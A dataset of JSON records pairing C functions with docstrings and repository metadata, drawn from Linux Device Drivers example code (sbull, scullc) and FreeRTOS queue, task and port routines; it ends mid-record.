{"docstring": "/*\n * Transfer a single BIO.\n */\n", "func_signal": "static int sbull_xfer_bio(struct sbull_dev *dev, struct bio *bio)", "code": "{\n\tint i;\n\tstruct bio_vec *bvec;\n\tsector_t sector = bio->bi_sector;\n\n\t/* Do each segment independently. */\n\tbio_for_each_segment(bvec, bio, i) {\n\t\tchar *buffer = __bio_kmap_atomic(bio, i, KM_USER0);\n\t\tsbull_transfer(dev, sector, bio_cur_bytes(bio) >> 9,\n\t\t\t\tbuffer, bio_data_dir(bio) == WRITE);\n\t\tsector += bio_cur_bytes(bio) >> 9;\n\t\t__bio_kunmap_atomic(bio, KM_USER0);\n\t}\n\treturn 0; /* Always \"succeed\" */\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * The \"invalidate\" function runs out of the device timer; it sets\n * a flag to simulate the removal of the media.\n */\n", "func_signal": "void sbull_invalidate(unsigned long ldev)", "code": "{\n\tstruct sbull_dev *dev = (struct sbull_dev *) ldev;\n\n\tspin_lock(&dev->lock);\n\tif (dev->users || !dev->data) \n\t\tprintk (KERN_WARNING \"sbull: timer sanity check failed\\n\");\n\telse\n\t\tdev->media_change = 1;\n\tspin_unlock(&dev->lock);\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Smarter request function that \"handles clustering\".\n */\n", "func_signal": "static void sbull_full_request(struct request_queue *q)", "code": "{\n\tstruct request *req;\n\tint sectors_xferred;\n\tstruct sbull_dev *dev = q->queuedata;\n\n\twhile ((req = blk_fetch_request(q)) != NULL) {\n\t\tif (req->cmd_type != REQ_TYPE_FS) {\n\t\t\tprintk (KERN_NOTICE \"Skip non-fs request\\n\");\n\t\t\t__blk_end_request(req, -EIO, blk_rq_cur_bytes(req));\n\t\t\tcontinue;\n\t\t}\n\t\tsectors_xferred = sbull_xfer_request(dev, req);\n\t\t__blk_end_request(req, 0, sectors_xferred);\n\t}\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Open and close.\n */\n", "func_signal": "static int sbull_open(struct block_device *bdev, fmode_t mode)", "code": "{\n\tstruct sbull_dev *dev = bdev->bd_disk->private_data;\n\n\tdel_timer_sync(&dev->timer);\n\t//filp->private_data = dev;\n\tspin_lock(&dev->lock);\n\tif (! dev->users) \n\t\tcheck_disk_change(bdev);\n\tdev->users++;\n\tspin_unlock(&dev->lock);\n\treturn 0;\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Revalidate.  WE DO NOT TAKE THE LOCK HERE, for fear of deadlocking\n * with open.  That needs to be reevaluated.\n */\n", "func_signal": "int sbull_revalidate(struct gendisk *gd)", "code": "{\n\tstruct sbull_dev *dev = gd->private_data;\n\t\n\tif (dev->media_change) {\n\t\tdev->media_change = 0;\n\t\tmemset (dev->data, 0, dev->size);\n\t}\n\treturn 0;\n}", "path": "LinuxDeviceDrivers3\\sbull\\sbull.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*\n * Data management: read and write\n */\n", "func_signal": "ssize_t scullc_read (struct file *filp, char __user *buf, size_t count,\n                loff_t *f_pos)", "code": "{\n\tstruct scullc_dev *dev = filp->private_data; /* the first listitem */\n\tstruct scullc_dev *dptr;\n\tint quantum = dev->quantum;\n\tint qset = dev->qset;\n\tint itemsize = quantum * qset; /* how many bytes in the listitem */\n\tint item, s_pos, q_pos, rest;\n\tssize_t retval = 0;\n\n\tif (down_interruptible (&dev->sem))\n\t\treturn -ERESTARTSYS;\n\tif (*f_pos > dev->size) \n\t\tgoto nothing;\n\tif (*f_pos + count > dev->size)\n\t\tcount = dev->size - *f_pos;\n\t/* find listitem, qset index, and offset in the quantum */\n\titem = ((long) *f_pos) / itemsize;\n\trest = ((long) *f_pos) % itemsize;\n\ts_pos = rest / quantum; q_pos = rest % quantum;\n\n    \t/* follow the list up to the right position (defined elsewhere) */\n\tdptr = scullc_follow(dev, item);\n\n\tif (!dptr->data)\n\t\tgoto nothing; /* don't fill holes */\n\tif (!dptr->data[s_pos])\n\t\tgoto nothing;\n\tif (count > quantum - q_pos)\n\t\tcount = quantum - q_pos; /* read only up to the end of this quantum */\n\n\tif (copy_to_user (buf, dptr->data[s_pos]+q_pos, count)) {\n\t\tretval = -EFAULT;\n\t\tgoto nothing;\n\t}\n\tup (&dev->sem);\n\n\t*f_pos += count;\n\treturn count;\n\n  nothing:\n\tup (&dev->sem);\n\treturn retval;\n}", "path": "LinuxDeviceDrivers3\\scullc\\main.c", "repo_name": "longluo/LinuxKernelLearn", "stars": 39, "license": "None", "language": "c", "size": 204}
{"docstring": "/*-----------------------------------------------------------\n * PUBLIC LIST API documented in list.h\n *----------------------------------------------------------*/\n", "func_signal": "void vListInitialise( xList *pxList )", "code": "{\n\t/* The list structure contains a list item which is used to mark the\n\tend of the list.  To initialise the list the list end is inserted\n\tas the only list entry. */\n\tpxList->pxIndex = ( xListItem * ) &( pxList->xListEnd );\n\n\t/* The list end value is the highest possible value in the list to\n\tensure it remains at the end of the list. */\n\tpxList->xListEnd.xItemValue = portMAX_DELAY;\n\n\t/* The list end next and previous pointers point to itself so we know\n\twhen the list is empty. */\n\tpxList->xListEnd.pxNext = ( xListItem * ) &( pxList->xListEnd );\n\tpxList->xListEnd.pxPrevious = ( xListItem * ) &( pxList->xListEnd );\n\n\tpxList->uxNumberOfItems = ( unsigned portBASE_TYPE ) 0U;\n}", "path": "list.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static void prvUnlockQueue( xQueueHandle pxQueue )", "code": "{\n\t/* THIS FUNCTION MUST BE CALLED WITH THE SCHEDULER SUSPENDED. */\n\n\t/* The lock counts contains the number of extra data items placed or\n\tremoved from the queue while the queue was locked.  When a queue is\n\tlocked items can be added or removed, but the event lists cannot be\n\tupdated. */\n\ttaskENTER_CRITICAL();\n\t{\n\t\t/* See if data was added to the queue while it was locked. */\n\t\twhile( pxQueue->xTxLock > queueLOCKED_UNMODIFIED )\n\t\t{\n\t\t\t/* Data was posted while the queue was locked.  Are any tasks\n\t\t\tblocked waiting for data to become available? */\n\t\t\tif( listLIST_IS_EMPTY( &( pxQueue->xTasksWaitingToReceive ) ) == pdFALSE )\n\t\t\t{\n\t\t\t\t/* Tasks that are removed from the event list will get added to\n\t\t\t\tthe pending ready list as the scheduler is still suspended. */\n\t\t\t\tif( xTaskRemoveFromEventList( &( pxQueue->xTasksWaitingToReceive ) ) != pdFALSE )\n\t\t\t\t{\n\t\t\t\t\t/* The task waiting has a higher priority so record that a\n\t\t\t\t\tcontext\tswitch is required. */\n\t\t\t\t\tvTaskMissedYield();\n\t\t\t\t}\n\n\t\t\t\t--( pxQueue->xTxLock );\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tpxQueue->xTxLock = queueUNLOCKED;\n\t}\n\ttaskEXIT_CRITICAL();\n\n\t/* Do the same for the Rx lock. */\n\ttaskENTER_CRITICAL();\n\t{\n\t\twhile( pxQueue->xRxLock > queueLOCKED_UNMODIFIED )\n\t\t{\n\t\t\tif( listLIST_IS_EMPTY( &( pxQueue->xTasksWaitingToSend ) ) == pdFALSE )\n\t\t\t{\n\t\t\t\tif( xTaskRemoveFromEventList( &( pxQueue->xTasksWaitingToSend ) ) != pdFALSE )\n\t\t\t\t{\n\t\t\t\t\tvTaskMissedYield();\n\t\t\t\t}\n\n\t\t\t\t--( pxQueue->xRxLock );\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tpxQueue->xRxLock = queueUNLOCKED;\n\t}\n\ttaskEXIT_CRITICAL();\n}", "path": "queue.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static void prvAddCurrentTaskToDelayedList( portTickType xTimeToWake )", "code": "{\n\t/* The list item will be inserted in wake time order. */\n\tlistSET_LIST_ITEM_VALUE( &( pxCurrentTCB->xGenericListItem ), xTimeToWake );\n\n\tif( xTimeToWake < xTickCount )\n\t{\n\t\t/* Wake time has overflowed.  Place this item in the overflow list. */\n\t\tvListInsert( ( xList * ) pxOverflowDelayedTaskList, ( xListItem * ) &( pxCurrentTCB->xGenericListItem ) );\n\t}\n\telse\n\t{\n\t\t/* The wake time has not overflowed, so we can use the current block list. */\n\t\tvListInsert( ( xList * ) pxDelayedTaskList, ( xListItem * ) &( pxCurrentTCB->xGenericListItem ) );\n\n\t\t/* If the task entering the blocked state was placed at the head of the\n\t\tlist of blocked tasks then xNextTaskUnblockTime needs to be updated\n\t\ttoo. */\n\t\tif( xTimeToWake < xNextTaskUnblockTime )\n\t\t{\n\t\t\txNextTaskUnblockTime = xTimeToWake;\n\t\t}\n\t}\n}", "path": "tasks.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static signed portBASE_TYPE prvIsQueueFull( const xQueueHandle pxQueue )", "code": "{\nsigned portBASE_TYPE xReturn;\n\n\ttaskENTER_CRITICAL();\n\t\txReturn = ( pxQueue->uxMessagesWaiting == pxQueue->uxLength );\n\ttaskEXIT_CRITICAL();\n\n\treturn xReturn;\n}", "path": "queue.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------\n * File private functions documented at the top of the file.\n *----------------------------------------------------------*/\n", "func_signal": "static void prvInitialiseTCBVariables( tskTCB *pxTCB, const signed char * const pcName, unsigned portBASE_TYPE uxPriority, const xMemoryRegion * const xRegions, unsigned short usStackDepth )", "code": "{\n\t/* Store the function name in the TCB. */\n\t#if configMAX_TASK_NAME_LEN > 1\n\t{\n\t\t/* Don't bring strncpy into the build unnecessarily. */\n\t\tstrncpy( ( char * ) pxTCB->pcTaskName, ( const char * ) pcName, ( unsigned short ) configMAX_TASK_NAME_LEN );\n\t}\n\t#endif\n\tpxTCB->pcTaskName[ ( unsigned short ) configMAX_TASK_NAME_LEN - ( unsigned short ) 1 ] = ( signed char ) '\\0';\n\n\t/* This is used as an array index so must ensure it's not too large.  First\n\tremove the privilege bit if one is present. */\n\tif( uxPriority >= configMAX_PRIORITIES )\n\t{\n\t\tuxPriority = configMAX_PRIORITIES - ( unsigned portBASE_TYPE ) 1U;\n\t}\n\n\tpxTCB->uxPriority = uxPriority;\n\t#if ( configUSE_MUTEXES == 1 )\n\t{\n\t\tpxTCB->uxBasePriority = uxPriority;\n\t}\n\t#endif\n\n\tvListInitialiseItem( &( pxTCB->xGenericListItem ) );\n\tvListInitialiseItem( &( pxTCB->xEventListItem ) );\n\n\t/* Set the pxTCB as a link back from the xListItem.  This is so we can get\n\tback to\tthe containing TCB from a generic item in a list. */\n\tlistSET_LIST_ITEM_OWNER( &( pxTCB->xGenericListItem ), pxTCB );\n\n\t/* Event lists are always in priority order. */\n\tlistSET_LIST_ITEM_VALUE( &( pxTCB->xEventListItem ), configMAX_PRIORITIES - ( portTickType ) uxPriority );\n\tlistSET_LIST_ITEM_OWNER( &( pxTCB->xEventListItem ), pxTCB );\n\n\t#if ( portCRITICAL_NESTING_IN_TCB == 1 )\n\t{\n\t\tpxTCB->uxCriticalNesting = ( unsigned portBASE_TYPE ) 0U;\n\t}\n\t#endif\n\n\t#if ( configUSE_APPLICATION_TASK_TAG == 1 )\n\t{\n\t\tpxTCB->pxTaskTag = NULL;\n\t}\n\t#endif\n\n\t#if ( configGENERATE_RUN_TIME_STATS == 1 )\n\t{\n\t\tpxTCB->ulRunTimeCounter = 0UL;\n\t}\n\t#endif\n\n\t#if ( portUSING_MPU_WRAPPERS == 1 )\n\t{\n\t\tvPortStoreTaskMPUSettings( &( pxTCB->xMPUSettings ), xRegions, pxTCB->pxStack, usStackDepth );\n\t}\n\t#else\n\t{\n\t\t( void ) xRegions;\n\t\t( void ) usStackDepth;\n\t}\n\t#endif\n}", "path": "tasks.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "signed portBASE_TYPE xQueueGenericReceive( xQueueHandle pxQueue, void * const pvBuffer, portTickType xTicksToWait, portBASE_TYPE xJustPeeking )", "code": "{\nsigned portBASE_TYPE xEntryTimeSet = pdFALSE;\nxTimeOutType xTimeOut;\nsigned char *pcOriginalReadPosition;\n\n\tconfigASSERT( pxQueue );\n\tconfigASSERT( !( ( pvBuffer == NULL ) && ( pxQueue->uxItemSize != ( unsigned portBASE_TYPE ) 0U ) ) );\n\n\t/* This function relaxes the coding standard somewhat to allow return\n\tstatements within the function itself.  This is done in the interest\n\tof execution time efficiency. */\n\n\tfor( ;; )\n\t{\n\t\ttaskENTER_CRITICAL();\n\t\t{\n\t\t\t/* Is there data in the queue now?  To be running we must be\n\t\t\tthe highest priority task wanting to access the queue. */\n\t\t\tif( pxQueue->uxMessagesWaiting > ( unsigned portBASE_TYPE ) 0 )\n\t\t\t{\n\t\t\t\t/* Remember our read position in case we are just peeking. */\n\t\t\t\tpcOriginalReadPosition = pxQueue->pcReadFrom;\n\n\t\t\t\tprvCopyDataFromQueue( pxQueue, pvBuffer );\n\n\t\t\t\tif( xJustPeeking == pdFALSE )\n\t\t\t\t{\n\t\t\t\t\ttraceQUEUE_RECEIVE( pxQueue );\n\n\t\t\t\t\t/* We are actually removing data. */\n\t\t\t\t\t--( pxQueue->uxMessagesWaiting );\n\n\t\t\t\t\t#if ( configUSE_MUTEXES == 1 )\n\t\t\t\t\t{\n\t\t\t\t\t\tif( pxQueue->uxQueueType == queueQUEUE_IS_MUTEX )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t/* Record the information required to implement\n\t\t\t\t\t\t\tpriority inheritance should it become necessary. */\n\t\t\t\t\t\t\tpxQueue->pxMutexHolder = xTaskGetCurrentTaskHandle();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t#endif\n\n\t\t\t\t\tif( listLIST_IS_EMPTY( &( pxQueue->xTasksWaitingToSend ) ) == pdFALSE )\n\t\t\t\t\t{\n\t\t\t\t\t\tif( xTaskRemoveFromEventList( &( pxQueue->xTasksWaitingToSend ) ) == pdTRUE )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tportYIELD_WITHIN_API();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\ttraceQUEUE_PEEK( pxQueue );\n\n\t\t\t\t\t/* We are not removing the data, so reset our read\n\t\t\t\t\tpointer. */\n\t\t\t\t\tpxQueue->pcReadFrom = pcOriginalReadPosition;\n\n\t\t\t\t\t/* The data is being left in the queue, so see if there are\n\t\t\t\t\tany other tasks waiting for the data. */\n\t\t\t\t\tif( listLIST_IS_EMPTY( &( pxQueue->xTasksWaitingToReceive ) ) == pdFALSE )\n\t\t\t\t\t{\n\t\t\t\t\t\t/* Tasks that are removed from the event list will get added to\n\t\t\t\t\t\tthe pending ready list as the scheduler is still suspended. */\n\t\t\t\t\t\tif( xTaskRemoveFromEventList( &( pxQueue->xTasksWaitingToReceive ) ) != pdFALSE )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t/* The task waiting has a higher priority than this task. */\n\t\t\t\t\t\t\tportYIELD_WITHIN_API();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t\ttaskEXIT_CRITICAL();\n\t\t\t\treturn pdPASS;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif( xTicksToWait == ( portTickType ) 0 )\n\t\t\t\t{\n\t\t\t\t\t/* The queue was empty and no block time is specified (or\n\t\t\t\t\tthe block time has expired) so leave now. */\n\t\t\t\t\ttaskEXIT_CRITICAL();\n\t\t\t\t\ttraceQUEUE_RECEIVE_FAILED( pxQueue );\n\t\t\t\t\treturn errQUEUE_EMPTY;\n\t\t\t\t}\n\t\t\t\telse if( xEntryTimeSet == pdFALSE )\n\t\t\t\t{\n\t\t\t\t\t/* The queue was empty and a block time was specified so\n\t\t\t\t\tconfigure the timeout structure. */\n\t\t\t\t\tvTaskSetTimeOutState( &xTimeOut );\n\t\t\t\t\txEntryTimeSet = pdTRUE;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\ttaskEXIT_CRITICAL();\n\n\t\t/* Interrupts and other tasks can send to and receive from the queue\n\t\tnow the critical section has been exited. */\n\n\t\tvTaskSuspendAll();\n\t\tprvLockQueue( pxQueue );\n\n\t\t/* Update the timeout state to see if it has expired yet. */\n\t\tif( xTaskCheckForTimeOut( &xTimeOut, &xTicksToWait ) == pdFALSE )\n\t\t{\n\t\t\tif( prvIsQueueEmpty( pxQueue ) != pdFALSE )\n\t\t\t{\n\t\t\t\ttraceBLOCKING_ON_QUEUE_RECEIVE( pxQueue );\n\n\t\t\t\t#if ( configUSE_MUTEXES == 1 )\n\t\t\t\t{\n\t\t\t\t\tif( pxQueue->uxQueueType == queueQUEUE_IS_MUTEX )\n\t\t\t\t\t{\n\t\t\t\t\t\tportENTER_CRITICAL();\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tvTaskPriorityInherit( ( void * ) pxQueue->pxMutexHolder );\n\t\t\t\t\t\t}\n\t\t\t\t\t\tportEXIT_CRITICAL();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t#endif\n\n\t\t\t\tvTaskPlaceOnEventList( &( pxQueue->xTasksWaitingToReceive ), xTicksToWait );\n\t\t\t\tprvUnlockQueue( pxQueue );\n\t\t\t\tif( xTaskResumeAll() == pdFALSE )\n\t\t\t\t{\n\t\t\t\t\tportYIELD_WITHIN_API();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* Try again. */\n\t\t\t\tprvUnlockQueue( pxQueue );\n\t\t\t\t( void ) xTaskResumeAll();\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tprvUnlockQueue( pxQueue );\n\t\t\t( void ) xTaskResumeAll();\n\t\t\ttraceQUEUE_RECEIVE_FAILED( pxQueue );\n\t\t\treturn errQUEUE_EMPTY;\n\t\t}\n\t}\n}", "path": "queue.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/* \n * See header file for description. \n */\n", "func_signal": "portSTACK_TYPE *pxPortInitialiseStack( portSTACK_TYPE *pxTopOfStack, pdTASK_CODE pxCode, void *pvParameters )", "code": "{\nunsigned short usAddress;\n\n\t/* Place a few bytes of known values on the bottom of the stack. \n\tThis is just useful for debugging. */\n\n\t*pxTopOfStack = 0x11;\n\tpxTopOfStack--;\n\t*pxTopOfStack = 0x22;\n\tpxTopOfStack--;\n\t*pxTopOfStack = 0x33;\n\tpxTopOfStack--;\n\n\t/* Simulate how the stack would look after a call to vPortYield() generated by \n\tthe compiler. */\n\n\t/*lint -e950 -e611 -e923 Lint doesn't like this much - but nothing I can do about it. */\n\n\t/* The start of the task code will be popped off the stack last, so place\n\tit on first. */\n\tusAddress = ( unsigned short ) pxCode;\n\t*pxTopOfStack = ( portSTACK_TYPE ) ( usAddress & ( unsigned short ) 0x00ff );\n\tpxTopOfStack--;\n\n\tusAddress >>= 8;\n\t*pxTopOfStack = ( portSTACK_TYPE ) ( usAddress & ( unsigned short ) 0x00ff );\n\tpxTopOfStack--;\n\n\t/* Next simulate the stack as if after a call to portSAVE_CONTEXT().  \n\tportSAVE_CONTEXT places the flags on the stack immediately after r0\n\tto ensure the interrupts get disabled as soon as possible, and so ensuring\n\tthe stack use is minimal should a context switch interrupt occur. */\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x00;\t/* R0 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = portFLAGS_INT_ENABLED;\n\tpxTopOfStack--;\n\n\n\t/* Now the remaining registers.   The compiler expects R1 to be 0. */\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x00;\t/* R1 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x02;\t/* R2 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x03;\t/* R3 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x04;\t/* R4 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x05;\t/* R5 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x06;\t/* R6 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x07;\t/* R7 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x08;\t/* R8 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x09;\t/* R9 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x10;\t/* R10 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x11;\t/* R11 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x12;\t/* R12 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x13;\t/* R13 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x14;\t/* R14 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x15;\t/* R15 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x16;\t/* R16 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x17;\t/* R17 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x18;\t/* R18 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x19;\t/* R19 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x20;\t/* R20 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x21;\t/* R21 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x22;\t/* R22 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x23;\t/* R23 */\n\tpxTopOfStack--;\n\n\t/* Place the parameter on the stack in the expected location. */\n\tusAddress = ( unsigned short ) pvParameters;\n\t*pxTopOfStack = ( portSTACK_TYPE ) ( usAddress & ( unsigned short ) 0x00ff );\n\tpxTopOfStack--;\n\n\tusAddress >>= 8;\n\t*pxTopOfStack = ( portSTACK_TYPE ) ( usAddress & ( unsigned short ) 0x00ff );\n\tpxTopOfStack--;\n\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x26;\t/* R26 X */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x27;\t/* R27 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x28;\t/* R28 Y */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x29;\t/* R29 */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x30;\t/* R30 Z */\n\tpxTopOfStack--;\n\t*pxTopOfStack = ( portSTACK_TYPE ) 0x031;\t/* R31 */\n\tpxTopOfStack--;\n\n\t/*lint +e950 +e611 +e923 */\n\n\treturn pxTopOfStack;\n}", "path": "port.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*----------------------------------------------------------*/\n", "func_signal": "signed portBASE_TYPE xTaskResumeAll( void )", "code": "{\nregister tskTCB *pxTCB;\nsigned portBASE_TYPE xAlreadyYielded = pdFALSE;\n\n\t/* If uxSchedulerSuspended is zero then this function does not match a\n\tprevious call to vTaskSuspendAll(). */\n\tconfigASSERT( uxSchedulerSuspended );\n\n\t/* It is possible that an ISR caused a task to be removed from an event\n\tlist while the scheduler was suspended.  If this was the case then the\n\tremoved task will have been added to the xPendingReadyList.  Once the\n\tscheduler has been resumed it is safe to move all the pending ready\n\ttasks from this list into their appropriate ready list. */\n\ttaskENTER_CRITICAL();\n\t{\n\t\t--uxSchedulerSuspended;\n\n\t\tif( uxSchedulerSuspended == ( unsigned portBASE_TYPE ) pdFALSE )\n\t\t{\n\t\t\tif( uxCurrentNumberOfTasks > ( unsigned portBASE_TYPE ) 0U )\n\t\t\t{\n\t\t\t\tportBASE_TYPE xYieldRequired = pdFALSE;\n\n\t\t\t\t/* Move any readied tasks from the pending list into the\n\t\t\t\tappropriate ready list. */\n\t\t\t\twhile( listLIST_IS_EMPTY( ( xList * ) &xPendingReadyList ) == pdFALSE )\n\t\t\t\t{\n\t\t\t\t\tpxTCB = ( tskTCB * ) listGET_OWNER_OF_HEAD_ENTRY(  ( ( xList * ) &xPendingReadyList ) );\n\t\t\t\t\tvListRemove( &( pxTCB->xEventListItem ) );\n\t\t\t\t\tvListRemove( &( pxTCB->xGenericListItem ) );\n\t\t\t\t\tprvAddTaskToReadyQueue( pxTCB );\n\n\t\t\t\t\t/* If we have moved a task that has a priority higher than\n\t\t\t\t\tthe current task then we should yield. */\n\t\t\t\t\tif( pxTCB->uxPriority >= pxCurrentTCB->uxPriority )\n\t\t\t\t\t{\n\t\t\t\t\t\txYieldRequired = pdTRUE;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t/* If any ticks occurred while the scheduler was suspended then\n\t\t\t\tthey should be processed now.  This ensures the tick count does not\n\t\t\t\tslip, and that any delayed tasks are resumed at the correct time. */\n\t\t\t\tif( uxMissedTicks > ( unsigned portBASE_TYPE ) 0U )\n\t\t\t\t{\n\t\t\t\t\twhile( uxMissedTicks > ( unsigned portBASE_TYPE ) 0U )\n\t\t\t\t\t{\n\t\t\t\t\t\tvTaskIncrementTick();\n\t\t\t\t\t\t--uxMissedTicks;\n\t\t\t\t\t}\n\n\t\t\t\t\t/* As we have processed some ticks it is appropriate to yield\n\t\t\t\t\tto ensure the highest priority task that is ready to run is\n\t\t\t\t\tthe task actually running. */\n\t\t\t\t\t#if configUSE_PREEMPTION == 1\n\t\t\t\t\t{\n\t\t\t\t\t\txYieldRequired = pdTRUE;\n\t\t\t\t\t}\n\t\t\t\t\t#endif\n\t\t\t\t}\n\n\t\t\t\tif( ( xYieldRequired == pdTRUE ) || ( xMissedYield == pdTRUE ) )\n\t\t\t\t{\n\t\t\t\t\txAlreadyYielded = pdTRUE;\n\t\t\t\t\txMissedYield = pdFALSE;\n\t\t\t\t\tportYIELD_WITHIN_API();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\ttaskEXIT_CRITICAL();\n\n\treturn xAlreadyYielded;\n}", "path": "tasks.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "signed portBASE_TYPE xQueueReceiveFromISR( xQueueHandle pxQueue, void * const pvBuffer, signed portBASE_TYPE *pxTaskWoken )", "code": "{\nsigned portBASE_TYPE xReturn;\nunsigned portBASE_TYPE uxSavedInterruptStatus;\n\n\tconfigASSERT( pxQueue );\n\tconfigASSERT( pxTaskWoken );\n\tconfigASSERT( !( ( pvBuffer == NULL ) && ( pxQueue->uxItemSize != ( unsigned portBASE_TYPE ) 0U ) ) );\n\n\tuxSavedInterruptStatus = portSET_INTERRUPT_MASK_FROM_ISR();\n\t{\n\t\t/* We cannot block from an ISR, so check there is data available. */\n\t\tif( pxQueue->uxMessagesWaiting > ( unsigned portBASE_TYPE ) 0 )\n\t\t{\n\t\t\ttraceQUEUE_RECEIVE_FROM_ISR( pxQueue );\n\n\t\t\tprvCopyDataFromQueue( pxQueue, pvBuffer );\n\t\t\t--( pxQueue->uxMessagesWaiting );\n\n\t\t\t/* If the queue is locked we will not modify the event list.  Instead\n\t\t\twe update the lock count so the task that unlocks the queue will know\n\t\t\tthat an ISR has removed data while the queue was locked. */\n\t\t\tif( pxQueue->xRxLock == queueUNLOCKED )\n\t\t\t{\n\t\t\t\tif( listLIST_IS_EMPTY( &( pxQueue->xTasksWaitingToSend ) ) == pdFALSE )\n\t\t\t\t{\n\t\t\t\t\tif( xTaskRemoveFromEventList( &( pxQueue->xTasksWaitingToSend ) ) != pdFALSE )\n\t\t\t\t\t{\n\t\t\t\t\t\t/* The task waiting has a higher priority than us so\n\t\t\t\t\t\tforce a context switch. */\n\t\t\t\t\t\t*pxTaskWoken = pdTRUE;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* Increment the lock count so the task that unlocks the queue\n\t\t\t\tknows that data was removed while it was locked. */\n\t\t\t\t++( pxQueue->xRxLock );\n\t\t\t}\n\n\t\t\txReturn = pdPASS;\n\t\t}\n\t\telse\n\t\t{\n\t\t\txReturn = 